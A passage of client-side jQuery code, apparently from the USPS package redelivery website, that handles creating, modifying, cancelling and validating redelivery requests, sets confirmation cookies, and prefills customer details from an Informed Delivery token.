            var addInstCheck = trackingsch.rdAdditionalInst;
            var isRepCheck = trackingsch.rdRep;
            var repFNCheck = trackingsch.rdRepFirst;
            var repLNCheck = trackingsch.rdRepLast;
            var repMICheck = trackingsch.rdRepMiddle;

            // first check the type
            if (informationTN && typeCheck == informationTN.rdType && tracking != indxsch) {
                //check everything else
                if (locCheck == informationTN.rdLocation && dateCheck == informationTN.rdDate && addInstCheck == informationTN.rdAdditionalInst && isRepCheck == informationTN.rdRep && repFNCheck == informationTN.rdRepFirst && repLNCheck == informationTN.rdRepLast && repMICheck == informationTN.rdRepMiddle) {
                    // check if Additionals exists
                    if (redeliveryInformation[tracking].hasMoreTN) {
                        var moreTracking = redeliveryInformation[tracking].hasMoreTN;
                        moreTracking.push(indxsch);
                        redeliveryInformation[tracking].hasMoreTN = moreTracking;
                    } else {
                        var moreTracking = [];
                        moreTracking.push(indxsch);
                        redeliveryInformation[tracking].hasMoreTN = moreTracking;
                    }

                    // remove the match
                    delete redeliveryInformation[indxsch];
                }
            }

        });

    });

    trackingList = Object.keys(redeliveryInformation);


    jQuery.each(trackingList, function (indx, tracking) {

        // Wait for each one to finish
        cccSubmitFinal(tracking);
    });

    var totalTrkd = setInterval(function () {

        if (trackingList.length == (confirmationNumbers.length + failTracking.length)) {
            clearInterval(totalTrkd);
            cookieItLocation();
        }

    }, 500);



}

function modifyRedelivery() {

    var getFirstRD = Object.keys(redeliveryInformation)[0];
    var confirmationNumber = $("#modifyConfirmationNumber").text();
    dataLayer.push({
        'page': 'modify-redelivery-step-1',
        'confirmationNumber': confirmationNumber
    });


    var data = {};

    data.confirmation = confirmationNumber;
    data.trackingNumber = Object.keys(redeliveryInformation).join(",");

    data.redeliveryType = redeliveryInformation[getFirstRD].rdType;
    data.redeliveryDate = moment(redeliveryInformation[getFirstRD].rdDate, "MM/DD/YYYY").format("YYYYMMDD");
    if (redeliveryInformation[getFirstRD].rdLocation) {
        data["redeliveryPickupLocation"] = redeliveryInformation[getFirstRD].rdLocation;
    }
    data.additionalInstructions = redeliveryInformation[getFirstRD].rdAdditionalInst;

    data.isRepPickup = redeliveryInformation[getFirstRD].rdRep;
    data.pickupRepFirstName = redeliveryInformation[getFirstRD].rdRepFirst;
    data.pickupRepMiddleInitial = redeliveryInformation[getFirstRD].rdRepMiddle;
    data.pickupRepLastName = redeliveryInformation[getFirstRD].rdRepLast;

    data.ipAddress = redeliveryusrIp;


    jQuery.ajax({
        url: "/ctrs/redelivery/updateRedelivery",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            var confirmation = resp.confirmation;
            cookieItLocationUpdate(confirmation);

        },
        error: function (jqXHR, exception) {

            var encCo = getURLParameter("confirmation");
            cookieItLocationFail(encCo);
        }
    });


}

function cancelRedelivery(confirmationNumber) {

    var data = {
        "confirmationNumber": confirmationNumber,
        "redeliveryDate": moment(jQuery("#select-date-modify").val()).format("YYYYMMDD")
    };

    jQuery.ajax({
        url: "/ctrs/redelivery/cancelRedelivery",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            cookieItLocationCancel(cancelData);

        },
        error: function (respCode) {
            if (respCode.status == 409) {
                $("#unable-cancel-request-modal").modal('show');
            } else {

                $("#service-unavailable-modal").modal('show');
            }
        }
    });


}


function cookieItLocation() {
    var now = new Date();


    var randomCookie = btoa(+new Date).slice(-7, -2);
    // Expire Quickly
    var expire = new Date(now.getTime() + 36000);



    document.cookie = "usps_rd_" + randomCookie + "=" + confirmationNumbers.join(",") + "; path=/; expires=" + expire.toGMTString() + "; Secure;";

    if (confirmationNumbers.length > 0) {
        if ($("#yes-radio").is(':checked')) {
            idxsGA('Yes');
            var crossSold = $("#yes-radio").data("xsellLink");
            window.open("/resources/redelivery-confirmation.htm?track=" + randomCookie, "_blank");
            window.open(crossSold, "_self");
        } else {
            if ($("#no-radio").is(':checked')) {
                idxsGA('No');
            }
            window.open("/resources/redelivery-confirmation.htm?track=" + randomCookie, "_self");
        }
    } else {
        $("#service-unavailable-modal").modal('show');
    }

}

function cookieItLocationUpdate(trackNumber) {
    var now = new Date();


    var randomCookie = btoa(+new Date).slice(-7, -2);
    // Expire Quickly
    var expire = new Date(now.getTime() + 36000);



    document.cookie = "usps_rd_" + randomCookie + "=" + trackNumber + "; path=/; expires=" + expire.toGMTString() + "; Secure;";

    window.open("/resources/redelivery-confirmation.htm?track=" + randomCookie + "&edit=true", "_self");

}

function cookieItLocationFail(trackNumber) {
    var now = new Date();


    var randomCookie = btoa(+new Date).slice(-7, -2);
    // Expire Quickly
    var expire = new Date(now.getTime() + 36000);



    document.cookie = "usps_rd_" + randomCookie + "=" + trackNumber + "; path=/; expires=" + expire.toGMTString() + "; Secure;";

    window.open("/resources/redelivery-confirmation.htm?track=" + randomCookie + "&failure=true", "_self");

}

function cookieItLocationCancel(trackNumber) {
    var now = new Date();


    var randomCookie = btoa(+new Date).slice(-7, -2);
    // Expire Quickly
    var expire = new Date(now.getTime() + 36000);



    document.cookie = "usps_rd_" + randomCookie + "=" + trackNumber + "; path=/; expires=" + expire.toGMTString() + "; Secure;";

    window.open("/resources/redelivery-confirmation.htm?track=" + randomCookie + "&cancel=true", "_self");

}


function cccSubmitFinal(sentTracking) {
    var redeliveryItemSet = {};
    var redeliveryDate = redeliveryInformation[sentTracking].rdDate;
    var redeliveryComments = redeliveryInformation[sentTracking].rdAdditionalInst;


    var data = {
        // Start with Address
        addressLineOne: userInformation.addressLineOne,
        addressLineTwo: userInformation.addressLineTwo,
        city: userInformation.city,
        state: userInformation.state,
        zipCode: userInformation.zip5,

        // Phone Number
        areaCodePhone: userInformation.phoneAreaCode,
        exchangePhone: userInformation.phoneExchange,
        linePhone: userInformation.phoneLine,

        // Customer Name
        firstName: userInformation.firstName,
        middleName: userInformation.middleName,
        lastName: userInformation.lastName,

        //Business Name
        companyName: userInformation.companyName,

        //Items for Redelivery
        trackingNumber: sentTracking,

        // If there is a rep
        isRepPickup: redeliveryInformation[sentTracking].rdRep,
        pickupRepFirstName: redeliveryInformation[sentTracking].rdRepFirst,
        pickupRepMiddleInitial: redeliveryInformation[sentTracking].rdRepMiddle,
        pickupRepLastName: redeliveryInformation[sentTracking].rdRepLast,

        //if there are addtional
        additionalTracking: redeliveryInformation[sentTracking].hasMoreTN,

        // Everything else
        ipAddress: redeliveryusrIp,
        emailAddress: userInformation.emailAddress,
        redeliveryDate: moment(redeliveryDate, "MM/DD/YYYY").format("YYYYMMDD"),
        additionalInstructions: redeliveryComments,
        redeliveryType: redeliveryInformation[sentTracking].rdType



        //If logged in
        //custRegId: "6875309"
    };


    if ($("#regUserID").val() != "") {
        data.custRegId = $("#regUserID").val();
    }
    
    if(getURLParameter("articleNumber"))
        {
            var cliType = "TOOLSQR";
            
            if(getURLParameter("t") == "GP")
                {
                   cliType = "TOOLSGOPOST";
                }
            if(getURLParameter("t") == "SD")
                {
                    cliType = "TOOLSSUNDAYQR";
                }
            
            data.sourceIdentifier = cliType;
        }

    if (redeliveryInformation[sentTracking].rdLocation) {
        data["redeliveryPickupLocation"] = redeliveryInformation[sentTracking].rdLocation;
    }
    jQuery.ajax({
        url: "/ctrs/redelivery/createRedelivery",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {

            var responseData = resp;
            // Get a Confirmation Number from CCC
            if (responseData.confirmation) {
                confirmationNumbers.push(responseData.confirmation)
            }

            // CCC was not successful - not eligibile
            else {
                failTracking.push(sentTracking);
            }

        },
        error: function (respCode) {

            console.log(respCode.status);
            if (respCode.status == 409) {
                $("#unable-create-request-modal").modal('show');
            } else {
                failTracking.push(sentTracking);
            }
        }
    });




}

function redeliveryValidate(tracking, selectedPickupType) {
    var hasErrors = false;
    switch (selectedPickupType) {
        case "CUSTOMER_PICKUP":
            var value = jQuery("#select-date-" + tracking).val();
            // just need date
            if (jQuery("#select-date-" + tracking).val()) {
                // Now check for Authorized Pickup
            } else {
                jQuery("#select-date-" + tracking).parent().addClass("error");
                hasErrors = true;
            }
            if (jQuery("#representative-for-" + tracking).is(":checked")) {
                var repFirst = jQuery("#rep-first-name-" + tracking).val();
                var repLast = jQuery("#rep-last-name-" + tracking).val();
                if (repFirst && !repLast) {
                    //bad last
                    jQuery("#rep-last-name-" + tracking).parent().addClass("error");
                    hasErrors = true;
                } else if (!repFirst && repLast) {
                    //bad first
                    jQuery("#rep-first-name-" + tracking).parent().addClass("error");
                    hasErrors = true;
                } else if (!repFirst && !repLast) {
                    //both bad
                    jQuery("#rep-last-name-" + tracking).parent().addClass("error");
                    jQuery("#rep-first-name-" + tracking).parent().addClass("error");
                    hasErrors = true;
                }
            }
            jQuery("#rep-last-name-" + tracking).keypress(function () {
                jQuery("#rep-last-name-" + tracking).parent().removeClass("error");
            });
            jQuery("#rep-first-name-" + tracking).keypress(function () {
                jQuery("#rep-first-name-" + tracking).parent().removeClass("error");
            });
            jQuery("#select-date-" + tracking).on('click', function () {
                jQuery(this).parent().removeClass("error")
            });
            break;
        case "REDELIVERY":
            if (jQuery("#select-date-" + tracking).val() && jQuery("#delivery-location-" + tracking).val()) {
                //were good.
            } else if (jQuery("#select-date-" + tracking).val() && !jQuery("#select-location-" + tracking).val()) {
                // bad delivery location
                jQuery("#delivery-location-" + tracking).parent().addClass("error");
                hasErrors = true;
            } else if (!jQuery("#select-date-" + tracking).val() && jQuery("#delivery-location-" + tracking).val()) {
                // bad selected date
                jQuery("#select-date-" + tracking).parent().addClass("error");
                hasErrors = true;
            } else {
                jQuery("#delivery-location-" + tracking).parent().addClass("error");
                jQuery("#select-date-" + tracking).parent().addClass("error");
                hasErrors = true;
            }

            jQuery("#select-date-" + tracking).on('click', function () {
                jQuery(this).parent().removeClass("error")
            });
            jQuery("#delivery-location-" + tracking).on('change', function () {
                jQuery(this).parent().removeClass("error")
            });

            break;
        case "RETURN":
            break;
        default:

    }


    if (selectedPickupType == "REDELIVERY" || selectedPickupType == "CUSTOMER_PICKUP") {
        // Do a date check
        var dateCheckable = moment(jQuery("#select-date-" + tracking).val(), "MM/DD/YYYY");
        var maxedDate = moment(jQuery("#select-date-" + tracking).data("rtsDate"), "MM/DD/YYYY");

        var rightnowGMT = moment.utc();
        var cutoffTime = moment.utc("07:00", "HH:mm");

        if (dateCheckable.isAfter(maxedDate)) {
            jQuery("#select-date-" + tracking).parent().addClass("error");
            hasErrors = true;
        }


        if (!dateCheckable.isAfter(moment()) && rightnowGMT.isAfter(cutoffTime)) {
            jQuery("#select-date-" + tracking).parent().addClass("error");
            hasErrors = true;
        }

        if (!dateCheckable.isSameOrAfter(moment()) && !rightnowGMT.isSameOrBefore(cutoffTime)) {
            jQuery("#select-date-" + tracking).parent().addClass("error");
            hasErrors = true;
        }

        if (dateCheckable.day() == 0) {
            jQuery("#select-date-" + tracking).parent().addClass("error");
            hasErrors = true;
        }

        if (holidays.includes(jQuery("#select-date-" + tracking).val())) {
            jQuery("#select-date-" + tracking).parent().addClass("error");
            hasErrors = true;
        }
    }


    // Make sure "other location has additional instructions"
    if (selectedPickupType == "REDELIVERY" && jQuery("#delivery-location-" + tracking).val() == "OTHER") {
        if (jQuery("#additional-pickup-inst-" + tracking).val() == 0) {
            jQuery("#instructError-" + tracking).css("display", "block");
            jQuery("#additional-pickup-inst-" + tracking).css("border", "1px solid #e71921");


            hasErrors = true;
        }

        jQuery("#additional-pickup-inst-" + tracking).on('keyup', function () {
            jQuery("#instructError-" + tracking).hide();
            jQuery("#additional-pickup-inst-" + tracking).css("border", "1px solid #333366");
            hasErrors = false;
        });
    }

    return hasErrors;
}


function trackingNumberEligibleCCC(ptrGroupData) {
    $.each(ptrGroupData, function (trackingNumberRes, ptrData) {

        var data = {};

        data.trackingNumber = trackingNumberRes;

        jQuery.ajax({
            url: "/ctrs/redelivery/trackingNumberValidate",
            type: "POST",
            data: JSON.stringify(data),
            headers: {
                "Content-Type": "application/json;charset=utf-8"
            },
            dataType: "json",
            success: function (resp) {

                var createCheck = resp.createRedelivery;
                var modCheck = resp.modifyRedelivery;
                var cancelCheck = resp.cancelRedelivery;
                var cccMCode = resp.cccCode;

                ptrGroupData[trackingNumberRes].isTrackCreateable = createCheck;
                ptrGroupData[trackingNumberRes].isTrackEditable = modCheck;
                ptrGroupData[trackingNumberRes].isTrackCancelable = cancelCheck;
                ptrGroupData[trackingNumberRes].tnMatchCode = cccMCode;

                packagesLookupAddressMatch(ptrGroupData);


            },
            error: function (jqXHR, exception) {

                $('.white-spinner-progress').removeClass('spinnerWhite');
                $(".white-spinner-wrapper").hide();
                $("#service-unavailable-modal").modal('show');
            }
        });

    });
}

function editTrack() {
    $("#terms-conditions-checkbox").parents('.step-drawer').find('.terms-conditions-wrapper').removeClass('error');
    $(".selectRed").parents('.review-error-wrapper').removeClass('error');
    setTimeout(function(){$(".selectRed").parents(".review-error-wrapper").removeClass("error");},250);

}

function buildReviewSection() {
    var typeMapping = {
        "REDELIVERY": "USPS<sup>&reg;</sup> Carrier Redelivery",
        "CUSTOMER_PICKUP": "Customer Pickup",
        "RETURN": "Return to Sender by USPS"
    };

    // Clear the Review Text
    jQuery("#review-selected-redeliveries").html("");
    jQuery.each(redeliveryInformation, function (trackReview, informationReview) {
        var displayText = "";
        if (informationReview.rdType == "RETURN") {
            displayText = "<div class=\"row\">";
            displayText = displayText + "<div class=\"col-12 col-md-5 tracking-number-box\">";
            displayText = displayText + "<p class=\"selected-tracking-number\">" + trackReview + "</p>";
            displayText = displayText + "<p class=\"selected-redelivery-type\">" + typeMapping[informationReview.rdType] + "</p>";
            displayText = displayText + "<a class=\"inline-link secondary\" onclick=\"editTrack();\" id=\"tracking-" + trackReview + "\" href=\"#edit-tracking-" + trackReview + "\">Edit</a> | <a class=\"inline-link secondary delete-selected-redelivery\" href=\"javascript:void(0)\" data-toggle=\"modal\" data-backdrop=\"static\" data-tracking-number=\"" + trackReview + "\">Delete</a>";
            displayText = displayText + "</div>";
            displayText = displayText + "</div>";
        } else {
            displayText = "<div class=\"row\">";
            displayText = displayText + "<div class=\"col-12 col-md-5 tracking-number-box\">";
            displayText = displayText + "<p class=\"selected-tracking-number\">" + trackReview + "</p>";
            displayText = displayText + "<p class=\"selected-redelivery-type\">" + typeMapping[informationReview.rdType] + ", " + informationReview.rdDate + "</p>";
            displayText = displayText + "<a class=\"inline-link secondary\" onclick=\"editTrack();\" id=\"tracking-" + trackReview + "\" href=\"#edit-tracking-" + trackReview + "\">Edit</a> | <a class=\"inline-link secondary delete-selected-redelivery\" href=\"javascript:void(0)\" data-toggle=\"modal\" data-backdrop=\"static\" data-tracking-number=\"" + trackReview + "\">Delete</a>";
            displayText = displayText + "</div>";
            displayText = displayText + "</div>";
        }

        jQuery("#review-selected-redeliveries").append(displayText);
        

        // now... make the edit clickable
        $('#tracking-' + trackReview).on('click touch', function (e) {
            e.preventDefault();
            $('.step-two-drawer, .column-item.tracking-manage-' + trackReview + ', .modify-redelivery-step').addClass('active');
            $('.step-two-drawer').addClass('edit-step current-step');
            $('.step-three-drawer, .confirm-modification-step').removeClass('step-complete');
            $('.step-three-drawer, .confirm-modification-step').removeClass('active current-step');
            $('.step-three-drawer').addClass('disabled');
            $('.step-four-drawer').addClass('disabled');
            $('.step-four-drawer').removeClass('active current-step');
            $('.confirm-modification-step').addClass('disabled');
            setTimeout(function(){
                    $(".selectRed").hide();
                    $(".selectRed").parents(".review-error-wrapper").removeClass("error");},150);

            $('html, body').animate({
                scrollTop: $(".tracking-manage-" + trackReview).offset().top
            }, 500);

            $('.step-wrapper.disabled').on('click touch', function () {
                $(this).parents('.container-fluid').find('.current-step').find('.review-error-wrapper').addClass('error');
            });

            // Now Add the step 3 disabled.
            setTimeout(function () {

                $('.step-three-drawer.disabled').on('click touch', function () {
                    $(".selectRed").show();
                });
                $('.step-four-drawer.disabled').on('click touch', function () {
                    $(".selectRed").show();
                });

            }, 250);

        });

        // and the delete
        // Delete the selected redelivery selection box.	
        $('.delete-selected-redelivery').on('click touch', function (e) {
            var trackNumberRemoval = $(this).data("trackingNumber");
            $('#delete-selected-redelivery-modal').modal();
            $('#delete-selected-redelivery-modal').data('bs.modal').options.backdrop = 'static';
            $thisParent = $(this);
            $('#delete-package-yes').on('click touch', function (e) {

                $(this).unbind('click touch');
                e.preventDefault();
                delete redeliveryInformation[trackNumberRemoval];
                $thisParent.closest('.tracking-number-box').remove();

                if (Object.keys(redeliveryInformation).length == 0) {
                    $('.step-two-drawer, .column-item.tracking-manage-' + trackReview + ', .modify-redelivery-step').addClass('active');
                    $('.step-two-drawer').addClass('edit-step current-step');
                    $('.step-three-drawer, .confirm-modification-step').removeClass('active current-step');
                    $('.step-three-drawer').addClass('disabled');
                    $('.confirm-modification-step').addClass('disabled');
                }
            });
        });

    });
}

function reenableFunctions() {


    var text_max = 250;
    $('.extra-input-field').on('keyup', function (event) {
        var text_length = $(this).val().length;
        var text_remaining = text_max - text_length;
        $(this).parents('.form-wrapper').find('.count_message').html(text_length + '/' + text_max);
        if (event.which == 8) {}



        // special characters
        var regex = /^[\.\,\_\&\-\(\)\?\#\/\+\@A-Za-z0-9 ]+$/
        if (!regex.test($(this).val()) && ($(this).val().length > 0)) {
            $(this).parent().find(".error-message-characters").attr('style', 'display:block;');
        } else {
            $(this).parent().find(".error-message-characters").attr('style', 'display:hidden;');
        }

    });

    // paste w/ right click
    $('.extra-input-field').on('paste', function (evt) {
        setTimeout(function () {
            $('.extra-input-field').trigger('keyup');
        }, 50);

    });




    // Display the additional requirements for the package pickup representative upon clicking the "Add someone..." checkbox. 
    $('.pickup-representative').click(function () {
        $(this).closest('.redelivery-pickup-wrapper').find('.representative-requirements-wrapper').toggle();
        $(this).closest('.redelivery-pickup-wrapper').find('.id-pickup').toggle();
    });


    // Expand/Collapse the tracking details drawers.
    $('.column-item .tracking-number-dropdown').on('click touch', function (e) {
        jQuery(this).parent().toggleClass('active');
    });
    // Display input fields based on the Redelivery Type.
    $('.redelivery-type-dropdown').change(function () {
        var tracking = $(this).attr('id').substr(15);

        if ($(this).val() === "REDELIVERY") {
            $(this).closest('.redelivery-details-wrapper').removeClass('pickup-redelivery return-sender-redelivery').addClass('carrier-redelivery');
            $(this).closest('.additional-instructions-wrapper').removeClass('col-md-5 col-sm-5').addClass('col-md-10 col-sm-10');
            $(this).closest('.carrier-redeliver-required').show();
            $(this).closest('.additional-instructions-wrapper').addClass('required-field');
        } else if ($(this).val() === "CUSTOMER_PICKUP") {
            $(this).closest('.redelivery-details-wrapper').removeClass('carrier-redelivery return-sender-redelivery').addClass('pickup-redelivery');
            $(this).closest('.additional-instructions-wrapper').removeClass('col-md-5 col-sm-5').addClass('col-md-10 col-sm-10');
            $(this).closest('.carrier-redeliver-required').hide();
            $(this).closest('.additional-instructions-wrapper').removeClass('required-field error');
            $(this).closest('.receive-confirmation-wrapper').show();
            // remove location requirement
            jQuery("#delivery-location-" + tracking).val('');
            jQuery("#instructError-" + tracking).hide();
            jQuery("#additional-pickup-inst-" + tracking).css("border", "1px solid #333366");
            jQuery("#delivery-location-" + tracking).trigger('click');

        } else if ($(this).val() === "RETURN") {
            $(this).closest('.redelivery-details-wrapper').removeClass('pickup-redelivery carrier-redelivery').addClass('return-sender-redelivery');
            $(this).closest('.additional-instructions-wrapper').removeClass('col-md-10 col-sm-10').addClass('col-md-5 col-sm-5');
            $(this).closest('.carrier-redeliver-required').hide();
            $(this).closest('.additional-instructions-wrapper').removeClass('required-field error');
            // remove location requirement
            jQuery("#delivery-location-" + tracking).val('');
            jQuery("#instructError-" + tracking).hide();
            jQuery("#additional-pickup-inst-" + tracking).css("border", "1px solid #333366");
            jQuery("#delivery-location-" + tracking).trigger('click');
        } else {
            $(this).closest('.redelivery-details-wrapper').removeClass('pickup-redelivery carrier-redelivery return-sender-redelivery').addClass('redelivery-not-special');
            $(this).closest('.additional-instructions-wrapper').removeClass('col-md-10 col-sm-10').addClass('col-md-5 col-sm-5');
            $(this).closest('.carrier-redeliver-required').hide();
            $(this).closest('.additional-instructions-wrapper').removeClass('required-field error');
            // remove location requirement
            $(this).closest('.delivery-location-dropdown').val('');
            jQuery("#instructError-" + tracking).hide();
            jQuery("#additional-pickup-inst-" + tracking).css("border", "1px solid #333366");

        }

        // Make the "Additional Instructions" input field a required field if "Other" is selected from the "Delivery Location" dropdown.
        $('.delivery-location-dropdown').change(function () {
            if ($(this).val() === "OTHER") {
                $(this).parents('.redelivery-details-wrapper').find('.additional-instructions-wrapper').addClass('required-field');
                $(this).parents('.redelivery-details-wrapper').find('.carrier-redeliver-required').show();
            } else {
                $(this).parents('.redelivery-details-wrapper').find('.additional-instructions-wrapper').removeClass('required-field');
                $(this).parents('.redelivery-details-wrapper').find('.carrier-redeliver-required').hide();
                jQuery("#instructError-" + tracking).hide();
                jQuery("#additional-pickup-inst-" + tracking).css("border", "1px solid #333366");
            }
        });
    });



    // Start Select Redelivery Details For This Package - Clear Button
    $('.clear-btn').on('click touchend', function (e) {
        $(this).parents('.form-wrapper').find('textarea').val('');
        $(this).parents('.form-wrapper').find('.count_message').html('0/250');
        $(this).parents('.redelivery-details-wrapper').find(".receive-confirmation-checkbox").prop('checked', false);
        $(this).parents('.redelivery-details-wrapper').find(".pickup-representative").prop('checked', false);
        $(this).parents('.redelivery-details-wrapper').find(".representative-requirements-wrapper").css('display', 'none');
        $(this).parents('.redelivery-details-wrapper').find(".representative-requirements-wrapper .form-control").val('');
        $(this).parents('.redelivery-details-wrapper').find(".delivery-location-dropdown").val('');
        $(this).parents('.redelivery-details-wrapper').find(".resume-start-input").val('');
        $(this).closest(".redelivery-details-wrapper").removeClass("pickup-redelivery return-sender-redelivery carrier-redelivery");
        $(this).parents('.redelivery-details-wrapper').find('.redelivery-type-dropdown').val('');
        $(this).parents('.redelivery-details-wrapper').find('.delivery-location-dropdown').val('');
        $(this).parents('.redelivery-details-wrapper').find('.additional-instructions-wrapper').removeClass('required-field');
        $(this).parents('.redelivery-details-wrapper').find('.carrier-redeliver-required').hide();
        $(this).parents('.redelivery-details-wrapper').find('.error-message-characters').hide();
        $(".selectDate").parent().removeClass("error");
        $(".redlivLocation").parent().removeClass("error");
        $(".redelivDropErrorMessage").parent().removeClass("error");
    });
}


// 8/29 - Informed Delivery Entry

function informedDeliveryToken(token)
{
        var data = {
            
            shaToken: token
    };

    jQuery.ajax({
        url: "/UspsToolsRestServices/rest/security/decryptToken",
        type: "POST",
        data: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        },
        dataType: "json",
        success: function (resp) {
            
            var phoneMask = "";
            phoneMask = resp.phoneNumber[0].number.substring(0, 3) + "-" + resp.phoneNumber[0].number.substring(3, 6) + "-" + resp.phoneNumber[0].number.substring(6, 10);
            // Fill In Data
            jQuery("#firstName").val(resp.firstName);
            jQuery("#lastName").val(resp.lastName);
            jQuery("#addressLineOne").val(resp.addressLineOne);
            jQuery("#city").val(resp.city);
            jQuery("#state").val(resp.state);
            jQuery("#zipCode").val(resp.zipCode);

            jQuery("#phone").val(phoneMask);
            jQuery("#emailAddress").val(resp.emailAddress);
            jQuery("#companyName").val(resp.companyName);
            
            
        }
    });
    
}
